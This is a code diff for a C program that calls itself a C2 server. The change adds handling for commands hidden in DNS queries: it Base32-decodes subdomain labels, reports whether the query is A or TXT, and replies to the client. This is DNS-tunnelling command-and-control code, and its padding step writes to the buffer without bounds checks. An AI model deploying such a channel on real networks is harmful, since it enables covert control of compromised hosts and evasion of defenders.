@@ -68,6 +68,9 @@ int main(int argc, char *argv[])
             domain_name[0] = '\0';
             int bytes_read = parse_domain_name(response_buffer, domain_name, sizeof(domain_name));
 
+            char *question_type_ptr = (char *)response_buffer + sizeof(struct dns_header) + strlen(domain_name) + 2; // +2 for null byte and length byte
+            uint16_t question_type = ntohs(*(uint16_t *)question_type_ptr);
+
             if (bytes_read > 0)
             {
                 printf("    Parsed domain name: %s\n", domain_name);
@@ -82,7 +85,23 @@ int main(int argc, char *argv[])
             {
                 *encoded_part = '\0';       // End string after encoded part
                 encoded_part = domain_name; // Point to the encoded part
-                printf("    Encoded part extracted: %s\n", encoded_part);
+
+                // Add missing Base32 '=' padding
+                size_t enc_len = strlen(encoded_part);
+                size_t pad_len = (8 - (enc_len % 8)) % 8;
+                for (size_t i = 0; i < pad_len; i++)
+                {
+                    encoded_part[enc_len + i] = '=';
+                }
+                encoded_part[enc_len + pad_len] = '\0';
+
+                char decoded_command[256] = {0};
+                size_t decoded_len = sizeof(decoded_command);
+                base32_decode(encoded_part, strlen(encoded_part), decoded_command, &decoded_len);
+
+                printf("    DNS Type: %s\n", (question_type == 1) ? "A" : (question_type == 16) ? "TXT"
+                                                                                                : "Other");
+                printf("    Decoded text: %s\n", decoded_command);
             }
 
             send_response("Hello from C2 server!", server_fd, header, &client_addr, client_addr_len, recv_len);
